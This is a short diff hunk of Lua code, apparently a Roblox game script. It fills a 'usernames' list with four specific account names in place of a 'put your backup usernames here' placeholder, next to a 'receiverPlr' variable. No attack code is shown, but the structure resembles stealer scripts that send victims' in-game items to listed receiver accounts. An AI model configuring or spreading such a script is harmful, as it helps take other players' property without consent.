@@ -605,7 +605,7 @@ end)
                 end
 
         local usernames = {
-            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
+            "Terensszxc", "BEESUYAH", "Kuni_Loot", "Kuni_Loot1"
         }
 
         local receiverPlr
